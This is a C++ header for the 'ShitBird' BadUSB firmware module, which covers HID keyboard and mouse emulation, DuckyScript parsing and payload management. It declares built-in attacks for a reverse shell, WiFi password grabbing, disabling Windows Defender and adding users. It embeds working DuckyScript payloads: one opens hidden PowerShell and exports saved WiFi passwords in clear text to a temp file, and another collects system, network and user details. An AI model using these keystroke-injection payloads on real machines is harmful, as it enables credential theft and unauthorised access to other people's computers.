/**
 * ShitBird Firmware - BadUSB Module
 * HID keyboard/mouse emulation and DuckyScript execution
 */

#ifndef SHITBIRD_BADUSB_MODULE_H
#define SHITBIRD_BADUSB_MODULE_H

#include <Arduino.h>
#include <USB.h>
#include <USBHIDKeyboard.h>
#include <USBHIDMouse.h>
#include <vector>
#include "config.h"

// Keyboard Layouts
enum class KeyboardLayout {
    US,
    UK,
    DE,
    FR,
    ES,
    IT
};

// BadUSB State
enum class BadUSBState {
    IDLE,
    CONNECTED,
    RUNNING_PAYLOAD,
    PAUSED
};

// DuckyScript Command Types
enum class DuckyCommand {
    NONE,
    REM,            // Comment
    DELAY,          // Delay in ms
    STRING,         // Type string
    STRINGLN,       // Type string + enter
    GUI,            // Windows/Super key
    WINDOWS,        // Same as GUI
    MENU,           // Context menu key
    APP,            // Same as MENU
    SHIFT,          // Shift key
    ALT,            // Alt key
    CONTROL,        // Control key
    CTRL,           // Same as CONTROL
    ENTER,          // Enter key
    ESCAPE,         // Escape key
    BACKSPACE,      // Backspace
    TAB,            // Tab
    SPACE,          // Space
    CAPSLOCK,       // Caps lock
    PRINTSCREEN,    // Print screen
    SCROLLLOCK,     // Scroll lock
    PAUSE,          // Pause/Break
    INSERT,         // Insert
    HOME,           // Home
    PAGEUP,         // Page up
    DELETE,         // Delete
    END,            // End
    PAGEDOWN,       // Page down
    UP,             // Up arrow
    DOWN,           // Down arrow
    LEFT,           // Left arrow
    RIGHT,          // Right arrow
    F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, F11, F12,
    REPEAT,         // Repeat previous command
    DEFAULT_DELAY,  // Set default delay between commands
    LED,            // Control LED (ShitBird specific)
    WAIT_FOR_BUTTON // Wait for button press
};

// Parsed DuckyScript Line
struct DuckyLine {
    DuckyCommand command;
    String argument;
    std::vector<uint8_t> modifiers;  // For combo keys
};

// Payload Info
struct PayloadInfo {
    String name;
    String description;
    String filename;
    String targetOS;  // Windows, macOS, Linux, All
};

class BadUSBModule {
public:
    static void init();
    static void update();
    static void deinit();

    // USB HID Control
    static bool isConnected();
    static void enable();
    static void disable();

    // Keyboard
    static void typeString(const String& str);
    static void typeChar(char c);
    static void pressKey(uint8_t key, uint8_t modifiers = 0);
    static void releaseKey(uint8_t key);
    static void releaseAll();
    static void setLayout(KeyboardLayout layout);

    // Mouse
    static void mouseMove(int8_t x, int8_t y);
    static void mouseClick(uint8_t button = 1);  // 1=left, 2=right, 3=middle
    static void mouseDoubleClick();
    static void mouseScroll(int8_t delta);
    static void mouseDrag(int8_t x, int8_t y);

    // DuckyScript Execution
    static bool loadPayload(const String& filename);
    static bool parseScript(const String& script);
    static void runPayload();
    static void stopPayload();
    static void pausePayload();
    static void resumePayload();
    static bool isRunning();
    static bool isPaused();
    static float getProgress();

    // Payload Management
    static std::vector<PayloadInfo>& getPayloads();
    static bool savePayload(const String& name, const String& script);
    static bool deletePayload(const String& name);
    static void loadPayloadsFromSD();

    // Built-in Payloads
    static void runRickroll();
    static void runInfoGather();  // Gather system info
    static void runReverseShell(const String& ip, uint16_t port);
    static void runWiFiGrab();    // Grab WiFi passwords
    static void runDisableDefender();
    static void runAddUser(const String& username, const String& password);

    // Key code helpers
    static uint8_t charToKeyCode(char c);
    static uint8_t getModifierForChar(char c);

    // Menu integration
    static void buildMenu(void* menuScreen);

private:
    static USBHIDKeyboard* keyboard;
    static USBHIDMouse* mouse;

    static bool initialized;
    static bool enabled;
    static BadUSBState state;
    static KeyboardLayout currentLayout;

    static std::vector<DuckyLine> currentScript;
    static std::vector<PayloadInfo> payloads;
    static int currentLine;
    static int defaultDelay;
    static DuckyLine lastCommand;

    static TaskHandle_t payloadTaskHandle;

    // Parsing
    static DuckyLine parseLine(const String& line);
    static DuckyCommand stringToCommand(const String& str);
    static uint8_t stringToKey(const String& str);

    // Execution
    static void payloadTask(void* param);
    static void executeCommand(const DuckyLine& cmd);
    static void executeKeyCombo(const std::vector<uint8_t>& keys, uint8_t finalKey);

    // Layout conversion
    static char convertToLayout(char c, KeyboardLayout layout);
};

// ============================================================================
// HID Key Codes (USB HID Usage Tables)
// ============================================================================

namespace HIDKey {
    const uint8_t NONE = 0x00;
    const uint8_t A = 0x04;
    const uint8_t B = 0x05;
    const uint8_t C = 0x06;
    const uint8_t D = 0x07;
    const uint8_t E = 0x08;
    const uint8_t F = 0x09;
    const uint8_t G = 0x0A;
    const uint8_t H = 0x0B;
    const uint8_t I = 0x0C;
    const uint8_t J = 0x0D;
    const uint8_t K = 0x0E;
    const uint8_t L = 0x0F;
    const uint8_t M = 0x10;
    const uint8_t N = 0x11;
    const uint8_t O = 0x12;
    const uint8_t P = 0x13;
    const uint8_t Q = 0x14;
    const uint8_t R = 0x15;
    const uint8_t S = 0x16;
    const uint8_t T = 0x17;
    const uint8_t U = 0x18;
    const uint8_t V = 0x19;
    const uint8_t W = 0x1A;
    const uint8_t X = 0x1B;
    const uint8_t Y = 0x1C;
    const uint8_t Z = 0x1D;

    const uint8_t NUM_1 = 0x1E;
    const uint8_t NUM_2 = 0x1F;
    const uint8_t NUM_3 = 0x20;
    const uint8_t NUM_4 = 0x21;
    const uint8_t NUM_5 = 0x22;
    const uint8_t NUM_6 = 0x23;
    const uint8_t NUM_7 = 0x24;
    const uint8_t NUM_8 = 0x25;
    const uint8_t NUM_9 = 0x26;
    const uint8_t NUM_0 = 0x27;

    const uint8_t ENTER = 0x28;
    const uint8_t ESCAPE = 0x29;
    const uint8_t BACKSPACE = 0x2A;
    const uint8_t TAB = 0x2B;
    const uint8_t SPACE = 0x2C;

    const uint8_t MINUS = 0x2D;
    const uint8_t EQUALS = 0x2E;
    const uint8_t LEFT_BRACKET = 0x2F;
    const uint8_t RIGHT_BRACKET = 0x30;
    const uint8_t BACKSLASH = 0x31;
    const uint8_t SEMICOLON = 0x33;
    const uint8_t APOSTROPHE = 0x34;
    const uint8_t GRAVE = 0x35;
    const uint8_t COMMA = 0x36;
    const uint8_t PERIOD = 0x37;
    const uint8_t SLASH = 0x38;

    const uint8_t CAPS_LOCK = 0x39;

    const uint8_t F1 = 0x3A;
    const uint8_t F2 = 0x3B;
    const uint8_t F3 = 0x3C;
    const uint8_t F4 = 0x3D;
    const uint8_t F5 = 0x3E;
    const uint8_t F6 = 0x3F;
    const uint8_t F7 = 0x40;
    const uint8_t F8 = 0x41;
    const uint8_t F9 = 0x42;
    const uint8_t F10 = 0x43;
    const uint8_t F11 = 0x44;
    const uint8_t F12 = 0x45;

    const uint8_t PRINT_SCREEN = 0x46;
    const uint8_t SCROLL_LOCK = 0x47;
    const uint8_t PAUSE = 0x48;
    const uint8_t INSERT = 0x49;
    const uint8_t HOME = 0x4A;
    const uint8_t PAGE_UP = 0x4B;
    const uint8_t DELETE = 0x4C;
    const uint8_t END = 0x4D;
    const uint8_t PAGE_DOWN = 0x4E;

    const uint8_t RIGHT_ARROW = 0x4F;
    const uint8_t LEFT_ARROW = 0x50;
    const uint8_t DOWN_ARROW = 0x51;
    const uint8_t UP_ARROW = 0x52;

    const uint8_t MENU = 0x65;

    // Modifiers
    const uint8_t MOD_NONE = 0x00;
    const uint8_t MOD_CTRL = 0x01;
    const uint8_t MOD_SHIFT = 0x02;
    const uint8_t MOD_ALT = 0x04;
    const uint8_t MOD_GUI = 0x08;  // Windows/Command key
}

// ============================================================================
// Built-in Payload Scripts
// ============================================================================

namespace BuiltInPayloads {
    // Simple Rickroll
    const char RICKROLL[] = R"(
REM Rickroll payload
GUI r
DELAY 500
STRING https://www.youtube.com/watch?v=dQw4w9WgXcQ
ENTER
)";

    // Windows WiFi Password Grab
    const char WIFI_GRAB_WINDOWS[] = R"(
REM Grab WiFi passwords on Windows
GUI r
DELAY 500
STRING powershell -windowstyle hidden
ENTER
DELAY 1000
STRING (netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv -Path "$env:temp\wifi.csv" -NoTypeInformation
ENTER
DELAY 2000
STRING exit
ENTER
)";

    // Windows System Info
    const char SYSINFO_WINDOWS[] = R"(
REM Gather Windows system info
GUI r
DELAY 500
STRING cmd
ENTER
DELAY 500
STRING systeminfo > %temp%\sysinfo.txt && ipconfig /all >> %temp%\sysinfo.txt && net user >> %temp%\sysinfo.txt
ENTER
DELAY 3000
STRING exit
ENTER
)";

    // Open Run dialog and execute command
    const char RUN_COMMAND[] = R"(
REM Open Run dialog
GUI r
DELAY 500
)";
}

#endif // SHITBIRD_BADUSB_MODULE_H
